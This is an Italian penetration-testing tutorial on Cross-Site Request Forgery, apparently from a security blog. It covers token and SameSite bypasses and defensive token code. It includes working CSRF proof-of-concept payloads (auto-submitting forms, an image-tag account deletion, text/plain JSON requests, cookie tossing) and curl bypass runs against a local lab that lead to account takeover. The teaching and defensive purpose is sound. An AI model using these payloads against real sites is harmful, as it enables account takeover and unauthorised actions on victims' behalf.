---
title: 'Cross-Site Request Forgery (CSRF): Attacco, Token e Bypass'
slug: csrf
description: 'Attacco Cross-Site Request Forgery (CSRF) nel pentesting web: Cos''è, vulnerabilità, PoC HTML, bypass dei token, cookie SameSite, API JSON e account takeover.'
image: /csrf.webp
draft: false
date: 2026-03-14T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - Cross-Site Request Forgery
  - CSRF Token
  - CSRF Protection
  - SameSite Cookies
  - CSRF Bypass
---

# CSRF: Cos'è il Cross-Site Request Forgery e Come Testarlo

Il **CSRF (Cross-Site Request Forgery)** è un attacco invisibile: la vittima apre una pagina dell'attaccante (o un'email, o un forum), il suo browser manda automaticamente una richiesta all'applicazione target includendo i cookie di sessione, e l'applicazione la esegue come se fosse legittima. Email cambiata, fondi trasferiti, account admin creato. La vittima non ha cliccato nulla di sospetto: è stato il browser a fare tutto in background.

Se cerchi il significato di CSRF e cosa significa un attacco CSRF, la risposta breve è nel prossimo paragrafo; qui trovi anche come testarlo, come si aggira il CSRF token e come si fa CSRF protection. Molti lo considerano un problema "risolto" da `SameSite=Lax`, che Chrome applica di default quando il cookie non dichiara nulla (altri browser si comportano in modo diverso). Non lo è: Lax blocca le richieste cross-site non-GET, ma non le GET con effetti collaterali, non quando `SameSite=None` è impostato esplicitamente, e non quando un redirect lato client (spesso un [open redirect](https://hackita.it/articoli/open-redirect/)) trasforma la richiesta in "same-site". Nei pentest si trova ancora, specialmente in intranet aziendali, applicazioni legacy e API che accettano `Content-Type: text/plain`.

Satellite della guida [Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa/). Vedi anche: [Session Hijacking](https://hackita.it/articoli/session-hijacking/) e [Clickjacking](https://hackita.it/articoli/clickjacking/).

## Cos'è un attacco CSRF (Cross-Site Request Forgery)

Il CSRF, o *cross site request forgery*, è un attacco web in cui un sito malevolo induce il browser di una vittima autenticata a inviare una richiesta a un altro sito, con i suoi cookie di sessione allegati. Il server la esegue come legittima: cambia email, sposta denaro, modifica permessi. Si previene con token anti-CSRF validati, cookie `SameSite` e controlli su `Origin`.

Un attacco **CSRF** sfrutta il fatto che il browser allega automaticamente i cookie di sessione a ogni richiesta verso un sito, indipendentemente da dove parte la richiesta. Se l'applicazione autentica l'utente solo tramite quel cookie e non verifica che la richiesta provenga davvero dalla sua interfaccia, una pagina esterna può far eseguire alla vittima un'azione che non ha scelto: cambiare email, trasferire denaro, modificare permessi.

A differenza di SQL injection o XSS, qui il codice dell'applicazione non ha bug di parsing: esegue esattamente quello che la richiesta gli chiede. Il problema è che non sa **chi** ha davvero avviato quella richiesta.

### CSRF significato: cosa vuol dire CSRF

CSRF significa *Cross-Site Request Forgery*, cioè "richiesta falsificata tra siti". In parole semplici: un sito cattivo fa fare al tuo browser, di nascosto, un'azione su un altro sito dove sei già loggato (cambiare l'email, fare un bonifico). Il sito vittima crede che l'abbia fatta tu, perché la richiesta arriva con i tuoi cookie. Lo trovi scritto anche XSRF, *session riding* o *cross site forgery*.

Se un programma ti mostra "CSRF detected" o "CSRF attack detected", vuol dire solo che ha bloccato una richiesta senza il token di sicurezza giusto. Non è detto che fosse un attacco vero: spesso è una pagina rimasta aperta troppo a lungo (vedi la sezione sugli errori più sotto).

### Un esempio semplicissimo

Immagina di avere in tasca una tessera che apre tutte le porte del tuo ufficio. Un tizio ti dà un volantino con scritto: "Passa la tessera sul lettore della cassaforte". Tu, distratto, lo fai. Il lettore vede la tua tessera e si apre. Tu non volevi aprire niente, ma la tessera ha "parlato" per te.

Nel CSRF la tessera è il cookie di sessione, il volantino è la pagina dell'attaccante e la cassaforte è il tuo account. Il sito non controlla se la richiesta l'hai voluta davvero: gli basta vedere la tessera.

### Il flusso dell'attacco

![Flusso di un attacco CSRF](/images/csrf-attack-flow.svg)

```text
1. The victim is authenticated on target.com (session cookie in the browser)
2. The victim visits evil.com (or opens an email, or reads a forum post)
3. evil.com contains HTML/JS that generates a request to target.com
4. The browser attaches the target.com cookies automatically
5. target.com receives the request, sees it as authenticated, executes it
6. The action is done: email changed, funds moved, admin created
7. The victim saw nothing
```

### Esempio di attacco CSRF

Un esempio di attacco CSRF: Marco è loggato sul sito della sua banca in una scheda. In un'altra scheda apre un link ricevuto in un forum, che carica una pagina con un form nascosto verso `bank.com/transfer`. Il browser invia il form con il cookie di sessione di Marco e la banca esegue il bonifico. Nessun furto di password, nessun malware: gli attacchi CSRF funzionano perché il cookie parte da solo. Lo stesso schema, con una richiesta di cambio email invece del bonifico, è l'esempio di CSRF attack che trovi più spesso nei pentest e nei report di bug bounty.

### Differenza con le vulnerabilità vicine (CSRF vs XSS)

| Vulnerabilità     | Dove sta il problema                                                      |
| ----------------- | ------------------------------------------------------------------------- |
| XSS               | Esecuzione di codice nel contesto del sito target                         |
| CSRF              | Nessuna verifica che la richiesta parta davvero dall'interfaccia dell'app |
| Clickjacking      | La vittima clicca, ma su un elemento mascherato                           |
| Session Hijacking | L'attaccante ruba la sessione, non la usa indirettamente                  |

Nel confronto XSS vs CSRF (o CSRF vs XSS) la differenza di fondo è questa: l'XSS esegue codice dentro il sito, il CSRF no. Il legame è stretto in un punto preciso: una vulnerabilità [XSS](https://hackita.it/articoli/xss/) sullo stesso sito, o su un suo sottodominio, permette di aggirare qualunque difesa CSRF, perché lo script malevolo gira già con i privilegi della pagina e non ha bisogno di una richiesta cross-site. È il cosiddetto **client-side CSRF**.

## App di prova usata negli esempi

Gli output di questa guida sono stati ottenuti su una piccola applicazione di test, scritta apposta e girata solo in locale: un endpoint `/login` che restituisce un token CSRF, e un endpoint `/api/account/email` che cambia l'email dell'utente autenticato. Non è un'app da scaricare, serve solo a mostrare cosa succede davvero in una risposta HTTP quando le protezioni mancano o sono fatte male.

```bash
# Login: the server returns a CSRF token and sets the session cookie
curl -s -c cookies.txt -X POST http://127.0.0.1:6000/login
```

```json
{"csrf_token":"79de2ee62134d0045e03cfa90c97b563","status":"logged in"}
```

## Come verificare se un'app è vulnerabile al CSRF

Checklist veloce prima di scendere nei dettagli:

* Il form o l'endpoint ha un token CSRF? Cercalo come campo nascosto (`<input type="hidden" name="csrf_token">`) o come header (`X-CSRF-Token`, `X-XSRF-Token`).
* Il cookie di sessione ha l'attributo `SameSite`? Controllalo con `curl -sI https://target.com | grep -i samesite`.
* Il server verifica `Origin` o `Referer`? Prova a inviare la richiesta senza quegli header, e poi con `Origin: https://evil.com`.
* L'azione sensibile è raggiungibile anche via GET?

## CSRF PoC: form, GET e fetch

### Form POST con auto-submit

Il payload classico, ripreso dalla metodologia di PayloadsAllTheThings: un form nascosto che si invia da solo al caricamento della pagina.

```html
<!-- evil.com: the victim visits this page -->
<!DOCTYPE html>
<html>
<body>
  <h1>Congratulazioni! Hai vinto un premio!</h1>
  <form action="https://target.com/api/account/email" method="POST" id="csrf">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

La vittima vede "hai vinto un premio", il browser invia il form con i suoi cookie, l'email dell'account viene cambiata. Da lì, un password reset verso la nuova email è un [account takeover](https://hackita.it/articoli/account-takeover/) completo.

### GET con effetti collaterali

Se un'azione sensibile è raggiungibile via GET, basta un tag immagine:

```html
<img src="https://target.com/api/account/delete?confirm=true" width="0" height="0" />
```

Il browser carica l'immagine, esegue la GET, l'account viene cancellato. Lo stesso schema vale per i trasferimenti nelle applicazioni legacy che accettano parametri via querystring.

### CSRF su API JSON

Le API moderne usano `application/json`, e il browser non invia JSON cross-origin con un form standard senza passare da un preflight CORS. Il trucco è usare `text/plain`, che è un "simple request" e non attiva il preflight:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/account/email_json");
xhr.withCredentials = true;
// application/json is not allowed in a simple request, text/plain is
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send('{"email":"attacker@evil.com"}');
</script>
```

Se il server legge il body con un parser JSON permissivo, senza controllare il `Content-Type` dichiarato, interpreta comunque il payload. Verificato sul lab:

```bash
curl -s -b cookies.txt -X POST http://127.0.0.1:6000/api/account/email_json \
  -H 'Content-Type: text/plain' -d '{"email":"plain@evil.com"}'
```

```json
{"email":"plain@evil.com","status":"email changed"}
```

In alternativa, un form con `enctype="text/plain"` costruisce un body che somiglia a JSON sfruttando il modo in cui il browser serializza i campi, e in alcuni casi aggira protezioni di tracking dei browser (per esempio il livello Standard di Enhanced Tracking Protection in Firefox):

```html
<form id="csrf" action="https://target.com/api/account/email_json" enctype="text/plain" method="POST">
  <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}' />
</form>
<script>document.getElementById('csrf').submit();</script>
```

## CSRF e richieste GET: funziona solo con le GET?

No. L'idea che il CSRF funzioni solo con le richieste GET (*CSRF only works with GET requests*) è un errore comune. Le GET sono il caso più facile da sfruttare, perché basta un tag `<img>`, ma una POST con form auto-submit funziona uguale, e anche PUT e DELETE se il server li accetta da un form o da un `fetch` mal protetto.

Il punto vero è il contrario: il CSRF per le richieste GET (*CSRF for GET requests*) è un problema soprattutto quando la GET cambia stato. Una GET dovrebbe essere sicura, cioè solo lettura; per questo di solito non serve un CSRF token su una richiesta GET che non modifica niente. Mettere il token nell'URL di una GET è anzi sconsigliato, perché finisce nei log, nella cronologia e nel `Referer`.

Su Salesforce esiste l'impostazione di sessione *Require CSRF protection on GET requests* (richiedi la protezione CSRF sulle richieste GET): serve proprio a coprire le pagine che cambiano stato via GET. Se la attivi e qualcosa si rompe, di solito è una pagina che faceva un'azione tramite un link, da riscrivere come POST.

## CSRF Token: come funziona e come si aggira (CSRF bypass)

Il token anti CSRF (*anti csrf token*) è una stringa segreta e imprevedibile che il server genera e poi si aspetta di ritrovare in ogni richiesta che cambia stato; l'attaccante non può leggerla da un altro sito, quindi non può falsificare la richiesta. Un token presente non significa però un token validato. Queste quattro tecniche di *CSRF bypass*, che ritrovi anche nei lab di PortSwigger sulla validazione del token, coprono la maggior parte dei casi reali.

![Quattro modi in cui si aggira il token CSRF](/images/csrf-token-bypass.svg)

### 1. Validazione dipendente dal metodo HTTP

Il server valida il token sulle richieste POST ma non sulle GET. Basta passare al metodo GET e mettere i parametri nella query string. Sul lab l'endpoint accetta anche GET e non controlla nulla:

```bash
curl -s -b cookies.txt "http://127.0.0.1:6000/api/account/email?email=via-get@evil.com"
```

```json
{"email":"via-get@evil.com","status":"email changed"}
```

### 2. Validazione dipendente dalla presenza del token

Il controllo scatta solo se il campo del token esiste nella richiesta. Rimuovendo l'intero parametro (non solo il valore, proprio il nome del campo), il controllo viene saltato del tutto. Verificato sul lab:

```bash
# The token field is omitted entirely, not just emptied
curl -s -b cookies.txt -X POST http://127.0.0.1:6000/api/account/email \
  -d 'email=victim-changed@evil.com'
```

```json
{"email":"victim-changed@evil.com","status":"email changed"}
```

Un token vuoto o un token con un carattere solo spesso vengono respinti, perché il campo è presente e qualcosa lo confronta. Il campo assente invece bypassa la logica a monte.

### 3. Token non legato alla sessione dell'utente

Se il server mantiene un pool globale di token validi, senza verificare a quale sessione appartengano, un token ottenuto con un account qualsiasi (anche quello dell'attaccante) viene accettato nell'attacco contro la vittima. Sul lab: l'attaccante fa login con il proprio account e ottiene un token, la vittima ha una sessione diversa, e la richiesta con la sessione della vittima e il token dell'attaccante passa:

```bash
# Attacker logs in on his own session and keeps the token
ATK=$(curl -s -c atk.txt -X POST http://127.0.0.1:6000/login | python3 -c 'import sys,json;print(json.load(sys.stdin)["csrf_token"])')

# Victim has a different session; the attacker's token is accepted anyway
curl -s -c vic.txt -X POST http://127.0.0.1:6000/login >/dev/null
curl -s -b vic.txt -X POST http://127.0.0.1:6000/api/account/email \
  -d "email=attacker-controlled@evil.com&csrf_token=$ATK"
```

```json
{"email":"attacker-controlled@evil.com","status":"email changed"}
```

Un valore inventato viene invece respinto, perché non è nel pool:

```bash
curl -s -b vic.txt -X POST http://127.0.0.1:6000/api/account/email \
  -d 'email=x@evil.com&csrf_token=AAAAAAAAAA'
```

```json
{"error":"invalid token"}
```

La differenza con il bypass precedente è tutta qui: un valore sbagliato viene bloccato, un campo assente no.

### 4. Token legato a un cookie non di sessione (double submit naive)

Se il server non mantiene alcuno stato e si limita a confrontare un cookie con un parametro del body, l'attaccante non ha bisogno di conoscere un token valido: gli basta impostare lui stesso il cookie nel browser della vittima (**cookie tossing**, possibile se controlla un qualsiasi sottodominio dello stesso sito) e inviare lo stesso valore come parametro.

```javascript
// The attacker sets this cookie from a sibling subdomain, then sends the same value as a field
document.cookie = "csrf=ATTACKER_VALUE; domain=.target.com; path=/"
```

```html
<form action="https://target.com/api/account/email" method="POST">
  <input type="hidden" name="csrf_token" value="ATTACKER_VALUE" />
</form>
```

Un **double submit cookie firmato** (il token è un HMAC calcolato lato server su un valore legato alla sessione, mai inventabile dall'attaccante) non ha questo problema: è la differenza tra la difesa consigliata da OWASP per le app stateless e l'implementazione ingenua che molti framework fanno per conto proprio.

## SameSite Cookie: cosa protegge davvero e dove si rompe

Per capire SameSite serve prima la differenza tra **site** e **origin**. Un *site* è il dominio registrabile (TLD+1, es. `example.com`) e considera lo schema: `http://example.com` e `https://example.com` sono cross-site tra loro. Un *origin* è più specifico: schema, host e porta. Una richiesta può essere cross-origin ma same-site (due sottodomini dello stesso dominio), mai il contrario.

![Comportamento di SameSite Lax](/images/csrf-samesite-lax.svg)

* **Strict**: il cookie non viene mai inviato in una richiesta cross-site, nemmeno cliccando un link da un altro sito. Protegge di più, ma può rompere flussi come "apri un link ricevuto via email e resta loggato".
* **Lax** (default nei browser moderni dal 2020, se il sito non imposta esplicitamente un valore): il cookie viene inviato in una richiesta cross-site solo se è una **GET avviata da una navigazione di primo livello** dell'utente (un link cliccato, non un'immagine o uno script in background). POST, richieste di background e iframe restano bloccate.
* **None**: nessuna restrizione. Richiede l'attributo `Secure`, altrimenti il browser rifiuta il cookie.

Dove Lax non basta, secondo la metodologia di [PortSwigger](https://portswigger.net/web-security/csrf) sul bypass di SameSite:

* **GET con effetti collaterali**: se un endpoint accetta GET per un'azione che dovrebbe essere POST, una navigazione di primo livello (`document.location = "..."`, o un link cliccato dall'utente) basta. Alcuni framework supportano un parametro tipo `?_method=POST` per sovrascrivere il metodo: la richiesta resta una GET agli occhi del browser, ma il server la tratta come POST.
* **Gadget on-site (redirect lato client)**: un redirect fatto in JavaScript che costruisce la destinazione da un parametro controllabile dall'attaccante genera una seconda richiesta, same-site agli occhi del browser, che include i cookie. Un redirect lato server non funziona allo stesso modo, perché il browser conserva il contesto cross-site della navigazione iniziale.
* **Sottodominio sibling**: due sottodomini dello stesso sito sono same-site tra loro. Una XSS su un sottodominio meno protetto può generare richieste same-site verso il dominio target, aggirando del tutto SameSite. La stessa logica vale per il [WebSocket hijacking](https://hackita.it/articoli/websocket-hijacking/) cross-site, se l'app espone un endpoint WebSocket che non verifica l'origine.

Sul lab corretto l'endpoint accetta solo POST, quindi la variante GET viene respinta a prescindere da SameSite e dal token (`curl` non applica SameSite, che è un controllo del browser: qui si vede la difesa lato server):

```bash
curl -s -b cookies.txt "http://127.0.0.1:6001/api/account/email?email=x@evil.com"
```

```json
{"error":"method not allowed"}
```

## Bypass di Origin e Referer

Se il controllo anti-CSRF si basa sul `Referer`, questi pattern passano spesso inosservati:

| URL di partenza                                     | Referer risultante                                  |
| --------------------------------------------------- | --------------------------------------------------- |
| `https://attacker.com/csrf.html`                    | `https://attacker.com/csrf.html`                    |
| `https://attacker.com/csrf.html?trusted.domain.com` | `https://attacker.com/csrf.html?trusted.domain.com` |
| `https://trusted.domain.com.attacker.com/csrf.html` | `https://trusted.domain.com.attacker.com/csrf.html` |

Un controllo scritto come "il Referer contiene `trusted.domain.com`" viene ingannato da tutti e tre: il dominio compare nella stringa, ma non è l'host. E se il server accetta la richiesta quando l'header manca del tutto (basta un tag `<meta name="referrer" content="no-referrer">` nella pagina d'attacco), il controllo non serve a niente.

La correzione, secondo il Cross-Site Request Forgery Prevention Cheat Sheet di OWASP: verificare prima `Origin` (se presente), altrimenti `Referer`, confrontando l'host **esattamente** con quello di destinazione, mai con un controllo "contiene". Se nessuno dei due header è presente o affidabile, la richiesta va rifiutata, non accettata per compatibilità.

## Burp CSRF PoC Generator

Per generare rapidamente un PoC durante un test: seleziona la richiesta vulnerabile in Burp, tasto destro, **Engagement tools → Generate CSRF PoC**. Burp costruisce l'HTML con il form pre-compilato e i pulsanti per attivare l'auto-submit; "Copy HTML" salva il file da far visitare alla vittima di test. Per i test sui token serve il [Repeater](https://hackita.it/articoli/burp-suite/): rimuovi il campo, svuotalo, mettici un valore casuale, prova il token di un altro utente, controlla se è sempre lo stesso su richieste ripetute.

## Workflow di test

1. **Mappa le azioni sensibili**: cambio email, cambio password, trasferimenti, creazione utenti, modifica permessi, cancellazione account, collegamento di servizi OAuth.
2. **Verifica le protezioni per ognuna**: token presente? Validato davvero (rimuovi il campo, non solo il valore)? `SameSite` sul cookie? Controllo su `Origin`/`Referer`?
3. **Se non protetta, genera il PoC** con Burp o a mano.
4. **Se il token c'è, prova il bypass**: metodo diverso, campo rimosso, token di un altro utente, token statico su richieste ripetute, cookie tossing sul double submit.
5. **Documenta l'impatto**: CSRF su cambio email vicino ad account takeover è critico, CSRF su creazione admin è una backdoor persistente, CSRF su un campo del profilo è medio, CSRF su un like o un commento è basso.

## Dalla CSRF all'account takeover

Un esempio concreto: l'endpoint di cambio email dell'app di prova non valida il token se il campo è assente (bypass 2 di sopra). Il PoC:

```html
<form action="https://target.com/api/account/email" method="POST" id="csrf">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.getElementById('csrf').submit();</script>
```

La vittima visita la pagina, l'email cambia, arriva una conferma all'indirizzo dell'attaccante. Da lì, un password reset verso la nuova email e il login con la password nuova completano l'account takeover. Se la stessa debolezza è presente sull'endpoint che crea nuovi utenti, e la vittima ha privilegi di amministratore, un secondo PoC crea un account admin a nome dell'attaccante, che resta valido anche dopo che il CSRF originale viene corretto: è una backdoor persistente, non solo una sessione rubata.

## Errori comuni

**"Abbiamo il token nel form"**. Ma è validato davvero? Il token presente nel markup e mai controllato dal server, oppure controllato solo se il campo esiste, è lo scenario più comune nei test reali.

**"SameSite=Lax ci protegge"**. Dalle POST cross-site sì. Non dalle GET con effetti collaterali, non dal method override, non da un gadget di redirect lato client, non da un sibling subdomain compromesso.

**"Le nostre API usano JSON, il CSRF non è possibile"**. Vero solo se il server rifiuta rigorosamente ogni `Content-Type` diverso da `application/json`. Se accetta anche `text/plain`, il CSRF via `fetch` con `credentials: 'include'` funziona, come verificato sopra.

**"Il token è in un cookie"**. Un double submit senza firma, dove il server si limita a confrontare cookie e parametro, è aggirabile con cookie tossing da chi controlla un sottodominio.

## Errori CSRF: token missing, token invalid e verification failed

Se sei uno sviluppatore o un utente che si è visto bloccare un form, questi sono i messaggi più comuni e cosa vogliono dire:

| Messaggio                                  | Significato                                            | Causa tipica                                                                    |
| ------------------------------------------ | ------------------------------------------------------ | ------------------------------------------------------------------------------- |
| CSRF token missing                         | Il token CSRF è mancante: la richiesta non lo contiene | Campo hidden assente nel form, header `X-CSRF-Token` non inviato dal JavaScript |
| CSRF token invalid                         | Il token c'è ma non corrisponde a quello atteso        | Sessione scaduta, token di un'altra sessione, form aperto in due schede         |
| CSRF token validation failed               | La validazione del token è fallita (mancante o errato) | Come sopra, spesso dopo un login o un cambio di sessione                        |
| CSRF verification failed. Request aborted. | Errore di Django: richiesta interrotta                 | Cookie bloccati, `Referer` assente su HTTPS, `{% csrf_token %}` mancante        |
| CSRF attack detected                       | Messaggio generico di alcuni framework e plugin        | Token non valido o `Origin` non ammesso                                         |

**Cosa significa "the CSRF token is invalid"?** Che il server ha ricevuto un token ma non è quello che aveva associato a quella sessione. Quasi sempre non è un attacco: è una sessione scaduta o un token riusato. Un utente deve ricaricare la pagina e riprovare; uno sviluppatore deve controllare che il token venga rigenerato e inviato a ogni richiesta.

**CSRF verification failed. Request aborted. (Firefox e altri browser).** Su Django è la causa più frequente di blocco. Su Firefox succede spesso quando i cookie sono bloccati per il sito, quando la protezione antitracciamento è troppo rigida o quando l'invio del `Referer` è disattivato. Per risolvere: abilita i cookie per quel sito, prova in una finestra senza estensioni e, lato sviluppo, controlla `CSRF_TRUSTED_ORIGINS` (con lo schema, per esempio `https://example.com`) e la presenza di `{% csrf_token %}` in ogni form POST.

Per il pentester questi messaggi sono utili: un errore diverso tra "token missing" e "token invalid" ti dice se il server distingue i due casi, quindi se vale la pena provare il bypass con campo rimosso descritto sopra.

## Come prevenire il CSRF (CSRF protection)

La *cross site request forgery prevention* seria è a più livelli: nessuno dei tre basta da solo. La protezione dal cross site request forgery si basa su un token anti CSRF validato, su `SameSite` e su un controllo di `Origin`.

![Difesa a livelli contro il CSRF](/images/csrf-defense-in-depth.svg)

**Synchronizer token**, la difesa di riferimento per le app con stato: un token segreto, imprevedibile, generato dal server e legato alla sessione. Va inviato in un campo hidden del form o in un header personalizzato, mai in un cookie da solo e mai nell'URL. Il server rifiuta la richiesta se il token manca o non corrisponde a quello associato alla sessione:

```python
import hmac
import secrets

def issue_token(session):
    session["csrf"] = secrets.token_hex(32)
    return session["csrf"]

def validate_token(session, submitted_token):
    expected = session.get("csrf")
    # constant-time comparison avoids timing attacks
    return bool(expected) and hmac.compare_digest(expected, submitted_token or "")
```

Esempio di anti CSRF token in Java con Spring Security, che salva il token in un cookie leggibile da JavaScript e lo richiede come header `X-CSRF-Token` o `X-XSRF-TOKEN`:

```java
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));
```

Se la validazione del token fallisce (*anti csrf token validation failed*), Spring risponde 403: controlla che il client invii l'header e che il cookie e la sessione siano gli stessi della richiesta che ha generato il token.

**Signed double submit cookie**, consigliato per le app stateless: il token è composto da un valore casuale e da un HMAC calcolato lato server su sessione e valore casuale, così l'attaccante non può inventarne uno valido. Viene impostato come cookie `Secure` e inviato dal client in un header o in un campo. Il server ricalcola l'HMAC e lo confronta, non si limita a controllare che cookie e campo coincidano.

```python
import hashlib
import hmac
import secrets

SECRET = b"server-side-secret-key"

def issue_token(session_id: str) -> str:
    # random value + HMAC bound to the session (OWASP signed double-submit)
    nonce = secrets.token_hex(16)
    msg = f"{len(session_id)}!{session_id}!{len(nonce)}!{nonce}".encode()
    return hmac.new(SECRET, msg, hashlib.sha256).hexdigest() + "." + nonce

def validate(session_id, cookie_value, header_value):
    if not cookie_value or not hmac.compare_digest(cookie_value, header_value or ""):
        return False
    mac, _, nonce = cookie_value.partition(".")
    msg = f"{len(session_id)}!{session_id}!{len(nonce)}!{nonce}".encode()
    return hmac.compare_digest(mac, hmac.new(SECRET, msg, hashlib.sha256).hexdigest())
```

**Custom header per le API**: un header come `X-CSRF-Token` su ogni richiesta che modifica stato. Funziona perché un form HTML non può aggiungere header personalizzati cross-origin, e un `fetch` che lo fa da un altro sito passa dal preflight CORS, che il server può rifiutare se l'origine non è nella whitelist (vedi anche [CORS misconfiguration](https://hackita.it/articoli/cors-misconfiguration/)). La whitelist deve essere esplicita, mai un pattern con wildcard sui sottodomini.

**SameSite** su `Strict` o `Lax` per il cookie di sessione, con il prefisso `__Host-` quando possibile. È un rinforzo, non la difesa principale: da sola non copre le GET con effetti collaterali né il client-side CSRF.

**Fetch Metadata**, dove disponibile: il browser invia `Sec-Fetch-Site` su ogni richiesta, e il server può bloccare ogni `cross-site` con metodo non sicuro (POST, PUT, PATCH, DELETE), accettando `same-origin` e trattando `same-site` con cautela se non ci si fida dei sottodomini. Va introdotto in modalità solo-log prima di bloccare davvero, per evitare falsi positivi.

**Mai operazioni di stato via GET**. Se proprio inevitabile, va protetta con lo stesso rigore di una POST.

**Login CSRF**: anche il login può essere forzato, facendo autenticare la vittima con l'account dell'attaccante (per farle salvare dati sotto un account che l'attaccante controlla). Si previene con una pre-sessione che porta già un token nel form di login, distrutta e ricreata dopo l'autenticazione per evitare anche la session fixation.

Verificato sul lab, con le tre difese applicate insieme (header obbligatorio, confronto con `hmac.compare_digest`, `SameSite=Strict`, `Content-Type` verificato):

```bash
curl -s -b cookies.txt -X POST http://127.0.0.1:6001/api/account/email \
  -H "X-CSRF-Token: 4d8d39af460cb52f6df6498d2404131f31f44b3661252a2fcac7adaadcda28a7" \
  -d 'email=legit@alice.com'

curl -s -b cookies.txt -X POST http://127.0.0.1:6001/api/account/email -d 'email=x@evil.com'
```

```json
{"email":"legit@alice.com","status":"email changed"}
{"error":"csrf token invalid"}
```

Stessa richiesta, stesso endpoint: con il token corretto passa, senza viene rifiutata.

## Checklist operativa

**Detection**

* Azioni sensibili mappate (email, password, trasferimenti, creazione utenti)
* Token presente nel form/header per ogni azione?
* `SameSite` del cookie analizzato (Strict/Lax/None/assente)
* `Origin`/`Referer` verificati dal server?

**Validazione del token**

* Richiesta senza il campo del token: funziona?
* Token vuoto: funziona?
* Token random: funziona?
* Token di un altro utente: funziona?
* Token statico su richieste ripetute: riusabile?
* Double submit: cookie tossing possibile?

**Bypass di SameSite**

* GET con effetto collaterale testata (se `SameSite=Lax`)
* Method override (`?_method=POST`) testato
* Gadget di redirect lato client testato
* `SameSite=None` presente senza altra protezione?

**Content-Type (API)**

* L'API accetta `text/plain` come JSON?
* L'API accetta `application/x-www-form-urlencoded`?

**Referer/Origin**

* Richiesta senza Referer (`<meta name="referrer" content="no-referrer">`) accettata?
* Referer con dominio dell'attaccante che "contiene" il dominio target: passa?

**PoC**

* HTML generato (Burp o manuale)
* Auto-submit testato
* Impatto documentato (account takeover, backdoor persistente, modifica dati, azione minore)

## FAQ

**Cos'è il Cross-Site Request Forgery?**
Un attacco in cui il browser della vittima, già autenticato su un sito, invia automaticamente una richiesta verso quel sito a partire da una pagina esterna, portando con sé i cookie di sessione. Il server la esegue perché la vede come legittima.

**SameSite=Lax rende il CSRF impossibile?**
No. Blocca le richieste cross-site inviate con metodi diversi da GET, non le GET con effetti collaterali, i method override, i gadget di redirect lato client o un sottodominio sibling compromesso.

**Un token CSRF presente nel form basta?**
No, deve essere validato: legato alla sessione, richiesto sempre (non solo se il campo esiste), confrontato con un confronto a tempo costante. Un token presente ma non controllato è equivalente a nessun token.

**Il CSRF è possibile sulle API JSON?**
Sì, se il server accetta `Content-Type: text/plain` o non verifica rigorosamente il Content-Type dichiarato: un `fetch` con `credentials: 'include'` e `text/plain` bypassa il blocco del preflight CORS su `application/json`.

**CSRF vs XSS: qual è la differenza?**
L'XSS esegue codice nel contesto del sito vulnerabile; il CSRF sfrutta una richiesta cross-site autenticata, senza eseguire codice sul sito target. Una XSS, anche su un sottodominio, rende inutile qualunque difesa CSRF.

**Cosa significa CSRF?**
CSRF significa Cross-Site Request Forgery. Il significato di CSRF è "richiesta falsificata tra siti": un sito esterno fa inviare al browser della vittima una richiesta autenticata verso un altro sito.

**Cosa significa "CSRF token missing" o "CSRF token invalid"?**
"Missing" vuol dire che la richiesta non conteneva il token, "invalid" che il token non corrisponde a quello della sessione. Di solito è una sessione scaduta o un form senza token, non un attacco.

**Il CSRF funziona solo con le richieste GET?**
No. Funziona con GET, POST e anche altri metodi se il server li accetta senza validare token e origine. Le GET con effetti collaterali sono solo il caso più semplice.

**Come si previene il CSRF?**
Con un token synchronizer legato alla sessione (o un double submit cookie firmato per le app stateless), `SameSite` come rinforzo, verifica di `Origin`/`Referer` come rete di sicurezza, e mai azioni di stato esposte via GET.

## Conclusione

Il CSRF non è un problema "risolto" dal default di `SameSite`. È un attacco che si continua a trovare perché i token esistono ma non vengono validati davvero, perché le API accettano `text/plain`, perché qualcuno ha lasciato un'azione sensibile raggiungibile via GET. Mappa le azioni che cambiano stato, verifica ogni protezione una alla volta, e documenta l'impatto reale: un cambio email senza token non è un dettaglio, è l'inizio di un account takeover.

Per chi studia da zero sul web hacking, parti da [OAuth](https://hackita.it/articoli/oauth-attack/) e dalla guida su [Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa/). E se vuoi portarti dietro un pezzo di Hackita mentre studi, nello [shop di Hackita](https://shop.hackita.it/) trovi il merchandising per chi vive di pentest e bug bounty.
